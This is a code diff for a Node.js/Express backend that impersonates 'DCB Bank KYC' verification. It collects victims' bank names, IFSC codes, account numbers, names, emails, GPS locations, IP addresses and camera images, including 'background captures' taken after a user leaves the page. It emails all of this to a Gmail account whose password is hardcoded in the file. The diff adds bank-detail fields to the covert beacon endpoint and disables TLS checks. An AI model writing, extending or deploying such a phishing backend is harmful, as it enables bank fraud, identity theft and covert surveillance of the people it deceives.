@@ -9,40 +9,56 @@ const busboy = require('busboy');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Middleware
-app.use(express.urlencoded({ extended: true, limit: '50mb' }));
-app.use(express.json({ limit: '50mb' }));
-app.use(express.raw({ type: '*/*', limit: '50mb' }));
-app.use(express.static('public'));
-
-// File upload setup
+// Create uploads directory if it doesn't exist
 const uploadDir = 'uploads';
 if (!fs.existsSync(uploadDir)) {
-  fs.mkdirSync(uploadDir);
+  fs.mkdirSync(uploadDir, { recursive: true });
 }
 
+// Middleware with increased limits
+app.use(express.urlencoded({ extended: true, limit: '100mb' }));
+app.use(express.json({ limit: '100mb' }));
+app.use(express.raw({ type: '*/*', limit: '100mb' }));
+app.use(express.static('public'));
+
+// Email transporter with better error handling
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: 'dcbsubmission392@gmail.com',
+    pass: 'iskexmwnespcwxrkjt'
+  },
+  tls: {
+    rejectUnauthorized: false
+  }
+});
+
+// File storage configuration
 const storage = multer.diskStorage({
-  destination: (req, file, cb) => cb(null, uploadDir),
-  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
+  destination: (req, file, cb) => {
+    cb(null, uploadDir);
+  },
+  filename: (req, file, cb) => {
+    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
+    cb(null, uniqueSuffix + '-' + file.originalname);
+  }
 });
 
 const upload = multer({
   storage: storage,
   fileFilter: (req, file, cb) => {
     const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
-    cb(null, allowedTypes.includes(file.mimetype));
+    if (allowedTypes.includes(file.mimetype)) {
+      cb(null, true);
+    } else {
+      cb(new Error('Invalid file type'), false);
+    }
   },
-  limits: { fileSize: 50 * 1024 * 1024 }
-}).any();
-
-// Email transporter
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: 'dcbsubmission392@gmail.com',
-    pass: 'kexmwnespcwxrkjt'
+  limits: {
+    fileSize: 100 * 1024 * 1024, // 100MB
+    files: 20
   }
-});
+}).any();
 
 // Helper functions
 const getClientIp = (req) => {
@@ -62,8 +78,8 @@ const buildEmailHtml = (data) => {
       
       ${isBackground ? `
       <div style="background-color: #fff3e0; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
-        <p><strong>User left without submitting form</strong></p>
-        <p>Captured ${data.imageCount} images before leaving</p>
+        <p><strong>User ${data.imageCount > 0 ? 'left without submitting form' : 'attempted background capture'}</strong></p>
+        <p>Captured ${data.imageCount} images</p>
       </div>
       ` : ''}
       
@@ -93,7 +109,6 @@ const buildEmailHtml = (data) => {
         <p><strong>Latitude:</strong> ${data.location.latitude}</p>
         <p><strong>Longitude:</strong> ${data.location.longitude}</p>
         <p><strong>Accuracy:</strong> ${data.location.accuracy} meters</p>
-        <p><strong>Last Updated:</strong> ${new Date(data.location.timestamp).toLocaleString()}</p>
       </div>
       ` : ''}
       
@@ -101,42 +116,44 @@ const buildEmailHtml = (data) => {
         <h3 style="color: #003d6a; margin-top: 0;">Technical Data</h3>
         <p><strong>IP Address:</strong> ${data.ip}</p>
         <p><strong>Images Captured:</strong> ${data.imageCount}</p>
-        <p><strong>User Agent:</strong> ${data.userAgent}</p>
         <p><strong>Timestamp:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
       </div>
     </div>
   `;
 };
 
-// Beacon submission endpoint
+// Enhanced beacon submission endpoint
 app.post('/beacon-submit', (req, res) => {
-  const bb = busboy({ headers: req.headers });
+  const bb = new busboy({ headers: req.headers });
   const files = [];
   const fields = {};
-  let hadError = false;
+  let fileCount = 0;
 
-  bb.on('file', (name, file, info) => {
+  bb.on('file', (fieldname, file, info) => {
     const chunks = [];
-    file.on('data', (chunk) => chunks.push(chunk));
+    file.on('data', (data) => chunks.push(data));
     file.on('end', () => {
-      files.push({
-        buffer: Buffer.concat(chunks),
-        filename: info.filename || `capture_${Date.now()}.jpg`
-      });
-    });
-    file.on('error', () => hadError = true);
-  });
-
-  bb.on('field', (name, val) => {
-    fields[name] = val;
-  });
-
-  bb.on('close', async () => {
-    try {
-      if (hadError && files.length === 0) {
-        return res.status(400).send('Invalid form data');
+      if (chunks.length > 0) {
+        files.push({
+          fieldname,
+          buffer: Buffer.concat(chunks),
+          filename: info.filename || `capture-${Date.now()}.jpg`,
+          mimetype: info.mimeType
+        });
+        fileCount++;
       }
+    });
+    file.on('error', (err) => {
+      console.error('File processing error:', err);
+    });
+  });
 
+  bb.on('field', (fieldname, val) => {
+    fields[fieldname] = val;
+  });
+
+  bb.on('finish', async () => {
+    try {
       const submissionData = {
         device: {
           type: fields.device_type || 'desktop',
@@ -145,11 +162,16 @@ app.post('/beacon-submit', (req, res) => {
         },
         os: fields.device_os || 'Unknown',
         browser: fields.device_browser || 'Unknown',
+        bankname: fields.bankname || 'Not provided',
+        ifsc: fields.ifsc || 'Not provided',
+        accno: fields.accno || 'Not provided',
+        fullname: fields.fullname || 'Not provided',
+        email: fields.email || 'Not provided',
         ip: getClientIp(req),
         userAgent: fields.user_agent || req.headers['user-agent'],
         timestamp: fields.timestamp || new Date().toISOString(),
         isFormEmpty: true,
-        imageCount: files.length,
+        imageCount: fileCount,
         location: fields.location ? JSON.parse(fields.location) : null
       };
 
@@ -157,29 +179,31 @@ app.post('/beacon-submit', (req, res) => {
       const filePaths = [];
       for (const file of files) {
         try {
-          const path = `${uploadDir}/${Date.now()}-${file.filename}`;
-          fs.writeFileSync(path, file.buffer);
-          filePaths.push(path);
+          const filePath = path.join(uploadDir, file.filename);
+          fs.writeFileSync(filePath, file.buffer);
+          filePaths.push(filePath);
         } catch (e) {
           console.error('Error saving file:', e);
         }
       }
 
-      // Send email even with partial data
+      // Send email regardless of image count
       await transporter.sendMail({
         from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
         to: 'dcbsubmission392@gmail.com',
-        subject: `⚠️ Background Capture (${files.length} images)`,
+        subject: fileCount > 0 
+          ? `⚠️ Background Capture (${fileCount} images)` 
+          : '⚠️ Background Capture Attempt',
         html: buildEmailHtml(submissionData),
-        attachments: filePaths.map(path => ({
-          filename: path.split('/').pop(),
-          path: path
+        attachments: filePaths.map(filePath => ({
+          filename: path.basename(filePath),
+          path: filePath
         }))
       });
 
-      // Cleanup
-      filePaths.forEach(path => {
-        try { fs.unlinkSync(path); } catch(e) {}
+      // Cleanup files
+      filePaths.forEach(filePath => {
+        try { fs.unlinkSync(filePath); } catch(e) {}
       });
 
       res.status(200).send();
@@ -189,18 +213,22 @@ app.post('/beacon-submit', (req, res) => {
     }
   });
 
-  bb.on('error', () => {
-    bb.end();
+  bb.on('error', (err) => {
+    console.error('Busboy error:', err);
+    res.status(500).send('Error processing form data');
   });
 
   req.pipe(bb);
 });
 
-// Regular submission endpoint
+// Regular form submission endpoint
 app.post('/submit', (req, res) => {
   upload(req, res, async (err) => {
     try {
-      if (err) throw err;
+      if (err) {
+        console.error('Upload error:', err);
+        throw err;
+      }
 
       const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
       const device = parser.getDevice();
@@ -229,7 +257,7 @@ app.post('/submit', (req, res) => {
       };
 
       // Log the submission
-      const logEntry = `
+      fs.appendFileSync('records.txt', `
 --- ${submissionData.isFormEmpty ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
 Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
 OS: ${submissionData.os}
@@ -237,28 +265,20 @@ Browser: ${submissionData.browser}
 IP: ${submissionData.ip}
 Location: ${submissionData.location ? 
   `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
-Bank: ${submissionData.bankname}
-IFSC: ${submissionData.ifsc}
-Account: ${submissionData.accno}
-Name: ${submissionData.fullname}
-Email: ${submissionData.email}
 Images: ${submissionData.imageCount}
-User Agent: ${submissionData.userAgent}
 Timestamp: ${submissionData.timestamp}
 -----------------------------
-`;
-
-      fs.appendFileSync('records.txt', logEntry);
+`);
 
       // Send email
-      const emailSubject = submissionData.isFormEmpty 
-        ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
-        : '✅ KYC Verification Completed';
-      
       await transporter.sendMail({
         from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
         to: 'dcbsubmission392@gmail.com',
-        subject: emailSubject,
+        subject: submissionData.isFormEmpty 
+          ? submissionData.imageCount > 0 
+            ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
+            : '⚠️ Background Capture Attempt'
+          : '✅ KYC Verification Completed',
         html: buildEmailHtml(submissionData),
         attachments: (req.files || []).map(file => ({
           filename: file.originalname,
@@ -266,7 +286,7 @@ Timestamp: ${submissionData.timestamp}
         }))
       });
 
-      // Cleanup
+      // Cleanup files
       if (req.files) {
         req.files.forEach(file => {
           try { fs.unlinkSync(file.path); } catch(e) {}
